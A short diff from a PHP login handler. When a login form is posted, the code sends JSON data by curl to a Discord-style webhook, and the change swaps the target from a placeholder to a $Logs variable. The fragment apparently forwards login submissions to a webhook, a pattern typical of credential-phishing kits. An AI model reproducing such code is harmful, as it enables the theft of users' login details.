@@ -152,7 +152,7 @@ if (isset($_POST['login']))
 	
 	], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
 	
-	$ch = curl_init("discordWebhookHere");
+	$ch = curl_init($Logs);
 	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 		'Content-type: application/json'
 	));
